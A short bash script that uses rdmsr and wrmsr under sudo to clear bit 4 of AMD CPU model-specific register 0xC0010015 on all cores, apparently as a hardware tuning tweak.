#! /bin/bash
sudo bash -c 'modprobe msr; CUR=$(rdmsr 0xc0010015); ENABLED=$(printf "%x" $((0x$CUR & ~16))); wrmsr -a 0xc0010015 0x$ENABLED'